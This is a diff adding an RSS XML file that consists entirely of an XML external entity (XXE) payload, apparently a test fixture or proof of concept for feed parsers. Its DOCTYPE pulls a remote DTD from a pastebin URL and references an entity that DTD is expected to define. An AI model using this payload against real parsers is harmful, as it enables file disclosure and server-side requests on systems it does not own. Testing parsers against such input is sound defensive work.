@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ 
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "https://pastebin.com/raw/1jesegPh">
+%xxe;
+]>
+
+<rss>
+<channel>
+    <item>
+        <description>1</description>
+        <link>1</link>
+        <title>&external;</title>
+    </item>
+</channel>
+</rss>
